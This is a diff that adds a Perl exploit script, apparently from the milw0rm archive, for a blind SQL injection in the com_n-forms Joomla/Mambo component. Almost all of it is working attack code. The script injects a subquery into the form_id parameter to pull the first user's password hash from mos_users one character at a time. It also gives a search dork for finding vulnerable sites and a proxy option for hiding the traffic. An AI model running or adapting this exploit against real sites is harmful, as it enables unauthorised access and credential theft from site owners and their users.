@@ -1,0 +1,99 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use Getopt::Long;
+if(!$ARGV[1])
+{
+  print "                                                                  \n";
+    print "   ################################################################\n";
+  print "   #   Mambot Component n-forms Blind SQL Injection Exploit       #\n";
+  print "   #   Author:The Moorish :D                                      #\n";
+  print "   #   Greetz:Team-dz,His0k4,x.CJP.x,Kader11000,c02,piRAte DIgitAL#\n";
+  print "   #   sites:www.h4cnc.com ,www.dz-secure.com                     #\n";
+  print "   #   Dork:    inurl:com_n-forms                                 #\n";   
+  print "   #   Usage:   perl forms.pl host path <options>                 #\n";
+  print "   #   Example: perl forms.pl www.host.com /path/ -f 10           #\n";
+  print "   #                                                              #\n";
+  print "   #   Options:                                                   #\n";
+  print "   #     -s   Valid form    id                                    #\n";
+  print "   #   Note:                                                      #\n";
+  print "   #   You can change the match string if you need that           #\n";
+  print "   ################################################################\n";
+  exit;
+}
+ 
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $userid  = 1;
+my $fid     = $ARGV[2];
+my %options = ();
+GetOptions(\%options, "u=i", "p=s", "f=i");
+print "[~] Exploiting...\n";
+if($options{"u"})
+{
+  $userid = $options{"u"};
+}
+if($options{"f"})
+{
+  $fid = $options{"f"};
+}
+syswrite(STDOUT, "[~] MD5-Hash: ", 14);
+for(my $i = 1; $i <= 32; $i++)
+{
+  my $f = 0;
+  my $h = 48;
+  while(!$f && $h <= 57)
+  {
+    if(istrue2($host, $path, $userid, $fid, $i, $h))
+    {
+      $f = 1;
+      syswrite(STDOUT, chr($h), 1);
+    }
+    $h++;
+  }
+  if(!$f)
+  {
+    $h = 97;
+    while(!$f && $h <= 122)
+    {
+      if(istrue2($host, $path, $userid, $fid, $i, $h))
+      {
+        $f = 1;
+        syswrite(STDOUT, chr($h), 1);
+      }
+      $h++;
+    }
+  }
+}
+print "\n[~] Exploiting done\n";
+sub istrue2
+{
+  my $host  = shift;
+  my $path  = shift;
+  my $uid   = shift;
+  my $fid   = shift;
+  my $i     = shift;
+  my $h     = shift;
+ 
+  my $ua = LWP::UserAgent->new;
+  my $query = "http://".$host.$path."index.php?option=com_n-forms&form_id=".$fid." and ascii(SUBSTRING((SELECT password FROM mos_users LIMIT 0,1 ),".$i.",1))=".$h."";
+ 
+  if($options{"p"})
+  {
+    $ua->proxy('http', "http://".$options{"p"});
+  }
+ 
+  my $resp = $ua->get($query);
+  my $content = $resp->content;
+  my $regexp = "nfields";
+ 
+  if($content =~ /$regexp/)
+  {
+    return 1;
+  }
+  else
+  {
+    return 0;
+  }
+}
+
+# milw0rm.com [2008-07-12]
